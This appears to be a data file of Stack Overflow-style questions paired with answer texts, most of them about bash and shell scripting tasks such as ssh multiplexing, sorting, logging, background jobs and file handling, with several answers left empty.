    "Sender and receiver to transfer files over ssh on request?": "I found a solution from another angle. Since version 3.9, OpenSSH supports session multiplexing: a single connection can carry multiple login or file transfer sessions. This avoids the set-up cost per connection.\nFor the case of the question, I can first open a connection with sets up a control master (-M) with a socket (-S) in a specific location. I don't need a session (-N).\nssh user@host -M -S /tmp/%r@%h:%p -N\nNext, I can invoke scp for each file and instruct it to use the same socket:\nscp -o 'ControlPath /tmp/%r@%h:%p' <file> user@host:<remotefile>\nThis command starts copying almost instantaneously!\nYou can also use the control socket for normal ssh connections, which will then open immediately:\nssh user@host -S /tmp/%r@%h:%p\nIf the control socket is no longer available (e.g. because you killed the master), this falls back to a normal connection. More information is available in this article.",
    "Why doesn't this bash expr command work? [duplicate]": "As @Cory rightly pointed out, there should not be spaces around the equal sign or else bash will confuse COUNTER for a command.\nCOUNTER=$(expr $COUNTER + 1)\ngoing off-topic ...\nThat said, you could avoid having bash fork a subprocess by using the following alternatives:\nUsing the bash builtin 'let' command:\nlet COUNTER=\"COUNTER + 1\"\nor, using bash c-style expression:\n(( COUNTER++ ))\nIn fact, your while loop can be written as:\nfor ((COUNTER=0; COUNTER <= 5 ; COUNTER++))\ndo\n    echo \"i will add this line to file mycreation\">>./myfile\ndone\nBreaking down the error message\nWhen you were met with the error:\nline 7:   0:    command not found.\n'-----'  '--'  '------------------'\n   |       |                 |\nlocation   |            Description of error.\n          culprit \nmy guess is what you had on line 7 was\n$COUNTER = `expr $COUNTER + 1`\n--------   --------------------\n    |                 |\nEvaluated to 0        |\n                  Evaluated to 1\nWhat bash ends up see is 0 = 1 and since bash statements are generally in the form command arg1 arg1 ..., bash interprets it as run the command 0 with arguments = 1. Thus the error message : 0: command not found.\nWhen you removed the spaces around the equal sign, what bash ends up interpreting is:\n0=1\nwhich means run command 0=1 with no arguments, hence the error 0=1: command not found.\nVariable assignments should be in the form VAR_NAME=VALUE (without the $), so the syntax you should be using is:\nCOUNTER=`expr $COUNTER + 1` # or any of the variants above\nwhich bash evaluates and eventually interpret as:\nCOUNTER=2",
    "Run Multiple Exec Commands in the same shell golang": "If you want to run multiple commands within a single shell instance, you will need to invoke the shell with something like this:\ncmd := exec.Command(\"/bin/sh\", \"-c\", \"command1; command2; command3; ...\")\nerr := cmd.Run()\nThis will get the shell to interpret the given commands. It will also let you execute shell builtins like cd. Note that this can be non-trivial to substitute in user data to these commands in a safe way.\nIf instead you just want to run a command in a particular directory, you can do that without the shell. You can set the current working directory to execute the command like so:\nconfig := exec.Command(\"./configure\", \"--disable-yasm\")\nconfig.Dir = folderPath\nbuild := exec.Command(\"make\")\nbuild.Dir = folderPath\n... and continue on like you were before.",
    "Opening file with spaces in Windows via Command Prompt": "I suspect start does something special when the first char of the first argument is a quote. The first argument is a window title, and the second is the command/file to open\nstart \"\" \"test space.avi\"\nhttp://ss64.com/nt/start.html",
    "Can't Connect to Mlab": "I think that you're using your mLab credentials. You must set a DB User at the User Tab like this:",
    "Output whole line once for each unique value of a column (Bash)": "Just use sort:\nsort -k 2,2 -u file\nThe -u removes duplicate entries (as you wanted), and the -k 2,2 makes just the field 2 the sorting field (and so ignores the rest when checking for duplicates).",
    "Cat a file Multiple times Without A Loop": "Assuming bash, you can use a one-line brace expansion hack:\ncat one_mb{,}{,}{,}{,}{,}{,}{,} > 128_mb",
    "List files that are in directory1 but NOT in directory2 and vice versa?": "a bit crude - but the easiest way I always use is (can play with the diff params, I typically use different grep\ndiff -rcw DIR1 DIR2| grep ^Only\nthen you can sort and format as you like\nRevised to format (less efficient as we are running diff twice here ... easily solved)\necho files only in $dir1\nLST=$(diff ${dir1} ${dir2}| grep \"^Only in ${dir1}\"| sed 's@^.*: @@')\n(cd ${dir1}; ls -l ${LST})\n\necho files only in $dir2\nLST=$(diff ${dir1} ${dir2}| grep \"^Only in ${dir2}\"| sed 's@^.*: @@')\n(cd ${dir2}; ls -l ${LST})\nExpanding on the sed expression above:\ns=search and replace\nthe three '@' are separating the expressions (this is TRADITIONALLY done with '/')\n^ matches the beginning of a line (forces the rest not to match elsewhere) . means any character\n* means the previous expression (.==match any char) 0-N times \": \" is what I matched on from the diff output \"Only in X: \"\nLook Mommy, no hands - now without 'sed' its beginning to be less and less crude\nXIFS=\"${IFS}\"\nIFS=$'\\n\\r'\nfor DIFFLINE in $(diff ${dir1} ${dir2}|grep ^Only); do\n  case \"${DIFFLINE}\" in\n   \"Only in ${dir1}\"*)  \n    LST1=\"${LST1} ${DIFFLINE#*:}\"\n    ;;\n   \"Only in ${dir2}\"*)  \n    LST2+=\"${DIFFLINE#*:}\"\n    ;;\n  esac\ndone\nIFS=\"${XIFS}\"\n\necho files only in $dir1\n(cd ${dir1}; ls -l ${LST1})\n\necho files only in $dir2\n(cd ${dir2}; ls -l ${LST2})\nYou will probably want to know about IFS ... it needs some reading in the bash manual, but its basically the field separator characters ... by default they include spaces and I don't want the loop to be fed with fractions of lines, just complete lines - so for the duration of the loop I override the default IFS to just newlines and carriage returns.\nBTW maybe your professor is reading stackoverflow, maybe next you wont be allowed to use semicolons ;-) ... (back to 'man bash' ... BTW if you do 'man bash' do it in emacs, makes much easier to read IMO)",
    "Raise exception on shell command failure?": "Ruby 2.6 adds an exception: argument:\nsystem('ctat nonexistent.txt', exception: true) # Errno::ENOENT (No such file or directory - ctat)",
    "What is the difference between . and ./ in bash? [closed]": "The shell uses spaces to separate the command to run and its parameters.\nIn the first example, the command to run is . with a parameter of a.out. The . command is a shell shortcut for source, which takes the name of a file containing shell commands as its first parameter and runs those commands in the current shell. This command fails because a.out is a binary file, not a shell script.\nIn the second example, the command to run is ./a.out, which means run the file a.out residing in the current directory.",
    "Can I change the order of the output fields from the Linux cut command? [duplicate]": "From man cut:\nSelected input is written in the same order that it is read, and is written exactly once.\nUse awk '{print $5,$6,$7,$8,$3,$4,$1}' instead of cut.",
    "Disable DeviceAdmin from shell?": "",
    "Chop 4 sides of image with Imagemagick": "You can combine two -crops:\n                      #left,top      right,bottom\nconvert test.png -crop +180+140 -crop -60-140 cropped.png",
    "how to delete a file with quote in file name": "If you only need to do this once in a while interactively, use\nrm -i -- *\nand answer y or n as appropriate. This can be used to get rid of many files having funny characters in their name.\nIt has the advantage of not needing to type/escape funny characters, blanks, etc, since the shell globbing with * does that for you. It is also as short as it gets, so easy to memorize.",
    "Android: How to strace an app using ADB shell am start": "",
    "generate a random file using shell script": "Use dd command to read data from /dev/random.\ndd if=/dev/random of=random.dat bs=1000000 count=5000\nThat would read 5000 1MB blocks of random data, that is a whole 5 gigabytes of random data!\nExperiment with blocksize argument to get the optimal performance.",
    "Bash scripting, checking for errors, logging": "For logging, you can arrange for all output written on standard output and/or standard error to go to a file. That way, you don't need to redirect the output of each command:\n# Save standard output and standard error\nexec 3>&1 4>&2\n# Redirect standard output to a log file\nexec 1>/tmp/stdout.log\n# Redirect standard error to a log file\nexec 2>/tmp/stderr.log\n\n# Now the output of all commands goes to the log files\necho \"This goes to /tmp/stdout.log\"\necho \"This goes to /tmp/stderr.log\" 1>&2\n...\n\n# Print a message to the original standard output (e.g. terminal)\necho \"This goes to the original stdout\" 1>&3\n\n# Restore original stdout/stderr\nexec 1>&3 2>&4\n# Close the unused descriptors\nexec 3>&- 4>&-\n\n# Now the output of all commands goes to the original standard output & error\n...\nTo execute a command only if a previous one succeeds, you can chain them with conditionals:\n# Execute command2 only if command1 succeeds, and command3 only if both succeed:\ncommand1 && command2 && command3\n\n# Execute command2 only if command1 fails\ncommand1 || command2\nso you can do things like\n{ find . -mtime +7 -type f -print0 | xargs -0 tar -cf \"${TAR}\" &&\n  gzip ${TAR} && \n  find . -mtime +7 -type f -print0 | xargs -0 rm -f } || \n    { echo \"Something failed\" 1>&2; exit 1 }\nor provide details in the log output:\nfind . -mtime +7 -type f -print0 | xargs -0 tar -cf \"${TAR}\" || \n  { echo \"find failed!!\" 1>&2; exit 1 }\ngzip ${TAR} || \n  { echo \"gzip failed!!\" 1>&2; exit 1 }\nfind . -mtime +7 -type f -print0 | xargs -0 rm -f || \n  { echo \"cleanup failed!!\" 1>&2; exit 1}",
    "bash while loop threading": "You can send tasks to the background by & If you intend to wait for all of them to finish you can use the wait command:\nprocess_to_background &\necho Processing ...\nwait\necho Done\nYou can get the pid of the given task started in the background if you want to wait for one (or few) specific tasks.\nimportant_process_to_background &\nimportant_pid=$!\nwhile i in {1..10}; do\n    less_important_process_to_background $i &\ndone\n\nwait $important_pid\necho Important task finished\n\nwait\necho All tasks finished\nOn note though: the background processes can mess up the output as they will run asynchronously. You might want to use a named pipe to collect the output from them.\nedit\nAs asked in the comments there might be a need for limiting the background processes forked. In this case you can keep track of how many background processes you've started and communicate with them through a named pipe.\nmkfifo tmp # creating named pipe\n\ncounter=0\nwhile read ip\ndo\n  if [ $counter -lt 10 ]; then # we are under the limit\n    { check $ip; echo 'done' > tmp; } &\n    let $[counter++];\n  else\n    read x < tmp # waiting for a process to finish\n    { check $ip; echo 'done' > tmp; } &\n  fi\ndone\ncat /tmp > /dev/null # let all the background processes end\n\nrm tmp # remove fifo",
    "Should I define a shell function as function x( ) or just x( )?": "log() \nis supported by the Bourne Shell family and any type of derivate (dash,yash) Is the POSIX std syntax and probably the one you want to use to write something compatible with old systems. Probably is the one you want to use.\nfunction log () { ...; }\nIs supported by bash and zsh but using both function and the () is simply WRONG and should be avoided.\nfunction log { ...; }\nIs the Korn Shell syntax and is supported by bash and zsh for compatibility reasons, but is not POSIX\nA quote from http://wiki.bash-hackers.org/scripting/obsolete about \"function log ()\"\nThis is an amalgamation between the Korn and POSIX style function definitions - using both the function keyword and parentheses. It has no useful purpose and no historical basis or reason to exist. It is not specified by POSIX. It is accepted by Bash, mksh, zsh, and perhaps some other Korn shells, where it is treated as identical to the POSIX-style function. It is not accepted by AT&T ksh. It should never be used. See the next table for the function keyword. Bash doesn't have this feature documented as expressly deprecated.",
    "Using the exec() family to run the \"cd\" command": "exec loads an executable file and replaces the current program image with it. As you rightly noted, cd is not an executable file, but rather a shell builtin. So the executable that you want to run is the shell itself. This is of course what system() does for you, but if you want to be explicit about it, you can use exec:\nexecl(\"/bin/sh\", \"-c\", \"cd\", (const char *)0);\nSince this replaces your current process image, you should do this after fork()ing off a new process.\nHowever, this entire procedure has absolutely no effect. If you want to change the directory in your current process, use chdir().",
    "Stay in directory changed after ending of bash script": "You can't. Changes to the current directory only affect the current process.",
    "How to get size of hidden files with \"du\"": "To size all the files in home directories including hidden files\ndu -sh $(ls -A)\ndu -sh .[^.]* *\nTo size only normal files\ndu -sh *\nTo size only hidden files\ndu -sh .[^.]*",
    "How to Encrypt after creating TAR Archive": "To encrypt tar file with password you need to use gpg.\nencrypt:\ntar czvpf - file1.txt file2.pdf file3.jpg \\\n | gpg --symmetric --cipher-algo aes256 -o myarchive.tar.gz\ndecrypt:\ngpg -d myarchive.tar.gz.gpg | tar xzvf -\nFor more information you can see:\nhttps://www.putorius.net/how-to-create-enrcypted-password.html",
    "Making a script that transforms sentences to title case?": "Since bash's parameter expansion includes case modification, there's no need for sed. Just a short function:\n tc() { set ${*,,} ; echo ${*^} ; }\nTest (don't use quotes, since a title is typically no longer than a sentence, it shouldn't matter):\ntc FOO bar\nOutput:\nFoo Bar\nFancy version that avoids capitalizing some conjunctions, articles and such:\nftc() { set ${*,,} ; set ${*^} ; echo -n \"$1 \" ; shift 1 ; \\\n        for f in ${*} ; do \\\n            case $f in  A|The|Is|Of|And|Or|But|About|To|In|By) \\\n                    echo -n \"${f,,} \" ;; \\\n                 *) echo -n \"$f \" ;; \\\n            esac ; \\\n        done ; echo ; }\nTest:\nftc the last of the mohicans\nOutput:\nThe Last of the Mohicans ",
    "Is Bash compiled or interpreted?": "Bash is a single-pass interpreter which means it reads one command at a time, interprets, and runs it then and there. The same thing is true with other types of shells - sh, ksh, zsh, csh, etc.\nHere is an example. I have a 3 line script called test.sh which looks like this:\necho one\necho two\n'\nWhen run as bash test.sh, it gives this output:\none\ntwo\ntest.sh: line 3: unexpected EOF while looking for matching `''\ntest.sh: line 4: syntax error: unexpected end of file\nIt runs the first and second commands successfully and then encounters the dangling single quote and throws the error.\nLet's say we write the same code in Perl, test.pl:\nprint \"one\\n\"\nprint \"two\\n\"\n'\nand run it with perl test.pl. We get:\nsyntax error at test.pl line 2, near \"print\"\nCan't find string terminator \"'\" anywhere before EOF at test.pl line 3.\nSo, it didn't run the first two lines at all, though they were syntactically correct. That's because Perl makes two passes. In the first pass, it does syntax checks and converts the script into an internal form. In the second pass, it runs it.\nThe simplicity of shell's single-pass execution is its biggest limitation as well. Tolerating syntax errors, even running at all, makes it hard to build large and robust code with the shell language. However, shell scripting is an ideal choice for quick and throw-away code, especially something that makes use of a lot of command line utilities.\nRelated:\nShell Operation - GNU Bash Manual\nIs Perl a compiled or an interpreted programming language?\nIs bash an interpreted language?",
    "read line and remove newline character using shell script": "You probably generated the text file on a windows machine or some other setting with dos line endings. You can fix that by either\nconverting the file to unix line endings with dos2unix\ndeleting '\\r' characters: cat $FILE | tr -d '\\r' | while read LINE ...\nuse a utility like awk to grab the first field: cat $FILE | awk '{print $1}' | while read LINE ...",
    "df nice output format in emails": "Try column -t\ndf -Ph | column -t",
    "Counting characters, words, length of the words and total length in a sentence": "riffing on Jaypal Singh's answer:\njcomeau@intrepid:~$ mystring=\"one two three four five\"\njcomeau@intrepid:~$ echo \"string length: ${#mystring}\"\nstring length: 23\njcomeau@intrepid:~$ echo -n \"lengths of words: \"; i=0; for token in $mystring; do echo -n \"${#token} \"; i=$((i+1)); done; echo; echo \"word count: $i\"\nlengths of words: 3 3 5 4 4 \nword count: 5\njcomeau@intrepid:~$ echo -n \"maximum string length: \"; maxlen=0; for token in $mystring; do if [ ${#token} -gt $maxlen ]; then maxlen=${#token}; fi; done; echo $maxlen\nmaximum string length: 5",
    "CakePHP: Run shell job from controller": "If you can't mitigate the need to do this as dogmatic suggests then, read on.\nSo you have a (potentially) long-running job you want to perform and you don't want the user to wait.\nAs the PHP code your user is executing happens during a request that has been started by Apache, any code that is executed will stall that request until it completion (unless you hit Apache's request timeout).\nIf the above isn't acceptable for your application then you will need to trigger PHP outwith the Apache request (ie. from the command line).\nUsability-wise, at this point it would make sense to notify your user that you are processing data in the background. Anything from a message telling them they can check back later to a spinning progress bar that polls your application over ajax to detect job completion.\nThe simplest approach is to have a cronjob that executes a PHP script (ie. CakePHP shell) on some interval (at minimum, this is once per minute). Here you can perform such tasks in the background.\nSome issues arise with background jobs however. How do you know when they failed? How do you know when you need to retry? What if it doesn't complete within the cron interval.. will a race-condition occur?\nThe proper, but more complicated setup, would be to use a work/message queue system. They allow you to handle the above issues more gracefully, but generally require you to run a background daemon on a server to catch and handle any incoming jobs.\nThe way this works is, in your code (when a user registers) you insert a job into the queue. The queue daemon picks up the job instantly (it doesn't run on an interval so it's always waiting) and hands it to a worker process (a CakePHP shell for example). It's instant and - if you tell it - it knows if it worked, it knows if it failed, it can retry if you want and it doesn't accidentally handle the same job twice.\nThere are a number of these available, such as Beanstalkd, dropr, Gearman, RabbitMQ, etc. There are also a number of CakePHP plugins (of varying age) that can help:\ncakephp-queue (MySQL)\nCakePHP-Queue-Plugin (MySQL)\nCakeResque (Redis)\ncakephp-gearman (Gearman)\nand others.\nI have had experience using CakePHP with both Beanstalkd (+ the PHP Pheanstalk library) and the CakePHP Queue plugin (first one above). I have to credit Beanstalkd (written in C) for being very lightweight, simple and fast. However, with regards to CakePHP development, I found the plugin faster to get up and running because:\nThe plugin comes with all the PHP code you need to get started. With Beanstalkd, you need to write more code (such as a PHP daemon that polls the queue looking for jobs)\nThe Beanstalkd server infrastructure becomes more complex. I had to install multiple instances of beanstalkd for dev/test/prod, and install supervisord to look after the processes).\nDeveloping/testing is a bit easier since it's a self-contained CakePHP + MySQL solution. You simply need to type cake queue add user signup and cake queue runworker.",
    "How to convert numbers to the first letters of the alphabet?": "In any shell, you could use:\necho \"$string\" | tr 0123456789 abcdefghij\nOr, in Bash and without a pipe:\ntr 0123456789 abcdefghij <<< \"$string\"\n(where the double quotes might not be necessary, but I'd use them to be sure).",
    "Why is mktemp on OS X broken with a command that worked on Linux?": "On Mac OS X, the -t option to mktemp takes an argument, which is a prefix for the temporary file/directory's name. On Linux, the -t argument just indicates that the prefix should either be the value of $TMPDIR or some default, usually /tmp.\nSo on Mac OS X, the invocation mktemp -t -d zombie.XXXXXXXXX, signifies -twith an argument is -d; consequently, mktemp creates a file whose name starts with -d inside $TMPDIR (/var/folders/d8/b8d1j9x94l9fr3y21xrnc0640000gn/T/-d.QZDPA9Da). Then, the template argument is used to create another file (zombie.nwlEnHGDb, in the current working directory). Finally, it prints both names to stdout, where they become the value of your variable ${myTEMP_DIR} (complete with newline separator). Hence, the cd fails.\nFor a platform-independent call, avoid the -t flag and use an explicit template:\nmktemp -d \"${TMPDIR:-/tmp}/zombie.XXXXXXXXX\"",
    "Missing LSB Information (Start-up Shell Script) [closed]": "To get rid of the warning we have to add the corresponding script header as described here.\n### BEGIN INIT INFO\n# Provides:          scriptname\n# Required-Start:    $remote_fs $syslog\n# Required-Stop:     $remote_fs $syslog\n# Default-Start:     2 3 4 5\n# Default-Stop:      0 1 6\n# Short-Description: Start daemon at boot time\n# Description:       Enable service provided by daemon.\n### END INIT INFO",
    "Script to count number of files in each directory": "Try the below one:\ndu -a | cut -d/ -f2 | sort | uniq -c | sort -nr\nfrom http://www.linuxquestions.org/questions/linux-newbie-8/how-to-find-the-total-number-of-files-in-a-folder-510009/#post3466477",
    "Append a text to the top of a file": " perl -pi -e 'print \"Title\\n\" if $. == 1' data.text",
    "How do shell text editors work?": "By using libraries such as the following which, in turn, use escape character sequences\nNAME\n       ncurses - CRT screen handling and optimization package\n\nSYNOPSIS\n       #include \n\nDESCRIPTION\n       The  ncurses library routines give the user a terminal-independent \nmethod of updating character screens with reasonable optimization.  This \nimplementation is \u2018\u2018new curses\u2019\u2019 (ncurses) and is the approved replacement \nfor 4.4BSD classic curses, which has been discontinued.\n\n[...snip....]\n\n       The ncurses package supports: overall screen, window and pad \nmanipulation; output to windows and pads; reading terminal input; control \nover terminal and curses input and output  options;  environment query \nroutines; color manipulation; use of soft label keys; terminfo capabilities; \nand access to low-level terminal-manipulation routines.",
    "Count number of occurrences of token in a file": "I think you're looking for\nuniq --count\n-c, --count prefix lines by the number of occurrences",
    "bash script - unable to set variable with double quotes in value": "In bash (and other POSIX shells), the following 2 states are equivalent:\n_account=foo\n_account=\"foo\"\nWhat you want to do is to preserve the quotations, therefore you can do the following:\n_account='\"foo\"'",
    "How do I change my default shell in Ubuntu when not in /etc/passwd? [closed]": "It sounds like the machine is configured so that it uses something other than the password file to control access to the machine. You can probably look at the /etc/nsswitch.conf file to see how the machine is configured.\nIf you run grep username /etc/passwd, you presumably get no output. If so, then changing the password file isn't going to help*. You need to find the system that controls your rights on the machine and get it changed there. It's moderately likely to be an LDAP-based system that is centrally managed. You may do best talking to the administrators of that external system.\nIf you want to fix it locally, you may have to modify your .profile to execute the shell you want:\nif [ \"$SHELL\" != \"/bin/bash\" ]\nthen\n    export SHELL=\"/bin/bash\"\n    exec /bin/bash -l    # -l: login shell again\nfi\nI've done this often enough; it's more or less what exists in a .cshrc file (for csh) except the syntax can be a bit different and unconditional (if it's executing a C shell startup file, it's the wrong shell!).\nSee also:\nHow to switch to Bash shell from some other shell?\nWhat's the difference between .bashrc, .bash_profile and .environment?\nNo doubt there are other relevant related questions too.\n* At the office here, there's an LDAP-based system, but our user names appear in the password file on the machine. However, the password file is rebuilt every hour or so, so you can't make lasting changes to the local password file. Sometimes there's a big enough window of opportunity to get something useful done, but it's fighting the system and basically counter-productive.",
    "awk - how to delete first column with field separator": "This is simple with cut:\n$ cut -d'|' -f1 infile\n87540221\n87540258\n87549647\n\n$ cut -d'|' -f2- infile\n1356438283301|1356438284971|1356438292151697\n1356438283301|1356438284971|1356438292151697\n1356438283301|1356438284971|1356438292151697\nJust redirect into the file you want:\n$ cut -d'|' -f1 infile > outfile1\n\n$ cut -d'|' -f2- infile > outfile2 && mv outfile2 file ",
    "How do I programmatically convert FLV video files to MP4 using a shell script in OS X?": "You can install ffmpeg via Homebrew or MacPorts. The commnd to install ffmpeg with Homebrew is brew install ffmpeg; similarly, the command to install ffmpeg with MacPorts is sudo port install ffmpeg. Once you've installed ffmpeg, here is a simple (and somewhat naive) script for converting the files. You may need to add more flags, depending on your desired options.\n#! /bin/bash\nfunction convert_all_to_mp4() {\n  for file in *.flv ; do\n    local bname=$(basename \"$file\" .flv)\n    local mp4name=\"$bname.mp4\"\n    ffmpeg -i \"$file\" \"$mp4name\"\n  done\n}\nconvert_all_to_mp4\nJust make whatever file you put the script above in executable (for example, chmod a+x path/to/convert_all_to_mp4.sh) and invoke it by its fully qualified path or add the directory containing it to the PATH environment varaible and invoke the script by the name you gave it.",
    "What does \"$$\" means in shell script? [duplicate]": "$$ means the process ID of the currently-running process.",
    "Recursively delete all empty folders in Bash": "This is simple, given the GNU find utility:\nfind . -type d -empty -delete\nThis will delete empty directories; since the -delete option implies the -depth option, it will delete directories that only had empty directories underneath them, so there's no need to run it multiple times.",
    "How to pass comma character in makefile function": "The manual says:\nCommas and unmatched parentheses or braces cannot appear in the text of an argument as written; leading spaces cannot appear in the text of the first argument as written. These characters can be put into the argument value by variable substitution.\nSo, you need to put comma into a variable, and use it in the argument. E.g:\nprint = echo '$(1)'\ncomma:= ,\n\nhelp:\n        @$(call print,He lives in Paris$(comma) does not he?)",
    "how to get the exit status of the first command in a pipe? [duplicate]": "Use the PIPESTATUS array:\n$ ls foo | cat\nls: foo: No such file or directory\n$ echo ${PIPESTATUS[0]} ${PIPESTATUS[1]}\n2 0\nNote: PIPESTATUS is a bashism (i.e. not POSIX).",
    "What's the difference between ${varname} and $varname in a shell scripts": "Using {} in variable names helps get rid of ambiguity while performing variable expansion.\nConsider two variables var and varname. Lets see you wanted to append the string name to the variable var. You can't say $varname because that would result in the expansion of the variable varname. However, saying ${var}name would help you achieve the desired result.\n$ var=\"This is var variable.\"\n$ varname=\"This is varname variable.\"\n$ echo $varname\nThis is varname variable.\n$ echo ${var}name\nThis is var variable.name\nBraces are also required when accessing any element of an array.\n$ a=( foo bar baz )       # Declare an array\n$ echo $a[0]              # Accessing first element -- INCORRECT\nfoo[0]\n$ echo ${a[0]}            # Accessing first element -- CORRECT\nfoo\nQuoting from info bash:\n   Any  element  of  an  array may be referenced using ${name[subscript]}.\n   The braces are required to avoid conflicts with pathname expansion.",
    "How to print file tree with hadoop?": "Based on http://en.wikipedia.org/wiki/Tree_(Unix) you can come up with a tree like representation, e.g:\nhadoop fs -lsr /mydir | awk '{print $8}' | \\\nsed -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'",
    "Linux: create random directory/file hierarchy": "You can use bash brace-expansion:\nmkdir -p {a,b}/{e,f,g}/{h,i,j}\n\u251c\u2500\u2500\u2500a\n\u2502   \u251c\u2500\u2500\u2500e\n\u2502   \u2502   \u251c\u2500\u2500\u2500h\n\u2502   \u2502   \u251c\u2500\u2500\u2500i\n\u2502   \u2502   \u2514\u2500\u2500\u2500j\n\u2502   \u251c\u2500\u2500\u2500f\n\u2502   \u2502   \u251c\u2500\u2500\u2500h\n\u2502   \u2502   \u251c\u2500\u2500\u2500i\n\u2502   \u2502   \u2514\u2500\u2500\u2500j\n\u2502   \u2514\u2500\u2500\u2500g\n\u2502       \u251c\u2500\u2500\u2500h\n\u2502       \u251c\u2500\u2500\u2500i\n\u2502       \u2514\u2500\u2500\u2500j\n\u2514\u2500\u2500\u2500b\n    \u251c\u2500\u2500\u2500e\n    \u2502   \u251c\u2500\u2500\u2500h\n    \u2502   \u251c\u2500\u2500\u2500i\n    \u2502   \u2514\u2500\u2500\u2500j\n    \u251c\u2500\u2500\u2500f\n    \u2502   \u251c\u2500\u2500\u2500h\n    \u2502   \u251c\u2500\u2500\u2500i\n    \u2502   \u2514\u2500\u2500\u2500j\n    \u2514\u2500\u2500\u2500g\n        \u251c\u2500\u2500\u2500h\n        \u251c\u2500\u2500\u2500i\n        \u2514\u2500\u2500\u2500j",
    "Length of shortest line?": "Try this:\nawk '{print length}' <your_file> | sort -n | head -n1\nThis command gets lengths of all files, sorts them (correctly, as numbers) and, fianlly, prints the smallest number to console.",
    "Executing a shell script in background with php": "",
    "How do I pass arguments to shell script?": "For bash (which is one shell, but probably the most common in the Linux world), the equivalent is:\njava temptable $1 $2\nassuming there's no spaces in the arguments. If there are spaces, you should quote your arguments:\njava temptable \"$1\" \"$2\"\nYou can also do:\njava temptable $*\nor:\njava temptable \"$@\"\nif you want all parameters passed through (again, that second one is equivalent to quoting each of the parameters: \"$1\" \"$2\" \"$3\" ...).",
    "Flask Shell Commands not working": "Thanks a lot to Miguel, the writer of the FLASK Mega Tutorial (go check that out) wo solved my problem!\nAs he pointed out in a comment below my question: you cannot have a module and a package with the same name. So no application folder and application.py at the same time.\nSolution:\nI changed my 'application.py into 'theapp.py' and now flask shell works like a charm! I did not need to change anything in my files, apart from running export FLASK_APP=theapp.py in the terminal.",
    "What is the difference between kill and kill -9?": "kill aka kill -TERM aka kill -15 is the safe and correct way of terminating a process. It's equivalent to safely shutting down a computer.\nkill -9 is the unsafe way of brutally murdering a process. It's equivalent to pulling the power cord, and may cause data corruption.\nSee the Linux&Unix stack exchange for more information.",
    "How to write binary data in Bash": "You can write arbitrary bytes in hex or octal with:\nprintf '\\x03' > file   # Hex\nprintf '\\003' > file   # Octal\nIf you have binary, it's a bit tricker, but you can turn it into octal with:\nprintf '%o\\n' \"$((2#00000011))\"\nwhich of course can be nested in the above:\nbinary=00000011\nprintf \"\\\\$(printf '%o' \"$((2#$binary))\")\" > file\nNote that this only works with up to 8 bits. If you want to write longer values, you have to split it up into groups of 8.",
    "How to execute commands in docker container as part of bash shell script": "You can use heredoc with docker exec command:\ndocker exec -i CONTAINER_NAME bash <<'EOF'\ncat /dev/null > /usr/local/tomcat/logs/app.log\nexit\nEOF\nTo use variables:\nlogname='/usr/local/tomcat/logs/app.log'\nthen use as:\ndocker exec -i CONTAINER_NAME bash <<EOF\ncat /dev/null > \"$logname\"\nexit\nEOF",
    "How can I launch an AppleScript application and run shell scripts from another AppleScript?": "Conceptually:\nthe run command launches and runs an application hidden\nthe activate command launches, runs, and activates the application (makes it the frontmost application)\nlaunch, according to Apple, \"Launches an application, if it is not already running, but does not send it a run command.\"\nfor AppleScript-based applications this should mean that they're loaded, but not executed (i.e., their - implicit or explicit - on run handler is NOT invoked), but in practice that is not true up to 10.9 - see below.\nit is unclear (to me) what exactly that means for non-AppleScript-based applications\nHere's how Apple thinks it works with AppleScript-based applications, which is only true starting with OSX 10.10 (Yosemite):\nA script can send commands to a script application just as it can to other applications. To launch a non-stay-open application and run its script, use a launch command followed by a run command, like this:\nlaunch application \"NonStayOpen\"\nrun application \"NonStayOpen\"\nThe launch command launches the script application without sending it an implicit run command. When the run command is sent to the script application, it processes the command, sends back a reply if necessary, and quits.\nBroken behavior on OSX 10.8, 10.9 (fixed in OSX 10.10):\nlaunch by itself is enough to run the application and is indeed the only command that works with AppleScript-based applications. Any attempt to execute run or activate (whether in addition to launch or not) runs the application - even twice when run from AppleScript editor(!; just once with osascript) - but reports failure <appName> got an error: Connection is invalid.\nThis strikes me as bug.\nNot sure how OSX versions <= 10.7 behave.\nNote: I've witnessed the non-executing behavior with launch once, but every non-stay-open AppleScript-based test app I've created from scratch on OS X 10.9.2 and OS X 10.8.5 also executes the script with launch - contradicting what the documentation says.\nPlease let me know if your system behaves differently and/or how older versions behave. On what OSX version was the app that doesn't execute with launch created?\nOn OSX 10.10, behavior is consistent with the documentation, with one thing worth noting:\nIf the intent is to launch and run in one step, run application is sufficient - no need for a separate launch application command first.\nOptions\n@user309603's pragmatic solution simply uses do shell script with the standard open utility to bypass the problem - this should work, regardless of whether the application is AppleScript-based or not:\ndo shell script \"open \" & \u00ac\n    quoted form of POSIX path of \u00ac\n    alias \":path:to:applescript:apps:shell-script-launcher.app\"\nIf you know the type of application you're invoking up front:\nto run an AppleScript-based app: best to use run script file, as @regulus6633 recommends - this has the added advantage that the invoked AppleScript-based application can return objects directly to the caller:\nrun script file \":path:to:applescript:apps:shell-script-launcher.app\"\nNote: There's also load script file, which indeed lets you merely load script code without executing it right away.\nto run non-AppleScript apps: use run / activate to run the app hidden / frontmost:\nrun application \":path:to:applescript:apps:shell-script-launcher.app\"\nYou could use run even with AppleScript-based applications and simply ignore errors with try ... end try, as @atonus suggests - the downside is that you won't be able to detect actual failure to invoke the application.\nYou can mitigate this by selectively ignoring only the specific Connection invalid error (which assumes this error would not legitimately occur) [no longer needed on OSX 10.10]:\ntry\n    run application \"Macintosh HD:Applications:_Sandbox-AppleScript0.app\"\non error number -609 # 'Connection is invalid' error that is spuriously reported\n    # simply ignore\nend try\nFinally, on OSX <= 10.9, you could try to simply use the launch command (though that didn't work for the OP, possibly due to working on a <= 10.7 OSX version):\n launch application \":path:to:applescript:apps:shell-script-launcher.app\"\nHowever, that is not advisable for two reasons:\nIn OSX 10.10, Apple has fixed the launch behavior to no longer execute also, so your code will break when run there.\nWhile non-AppleScript apps typically do run (hidden) when invoked with launch, the documentation says that AppleScript \"does not send it a run command\" and \"allows you to open an application without performing its usual startup procedures, such as opening a new window\" - what that exactly means is not clear and different applications seem to handle this differently.",
    "Run shell script from Java Synchronously": "You want to wait for the Process to finish, that is waitFor() like this\npublic void executeScript() {\n  try {\n    ProcessBuilder pb = new ProcessBuilder(\n      \"myscript.sh\");\n    Process p = pb.start();     // Start the process.\n    p.waitFor();                // Wait for the process to finish.\n    System.out.println(\"Script executed successfully\");\n  } catch (Exception e) {\n    e.printStackTrace();\n  }\n}",
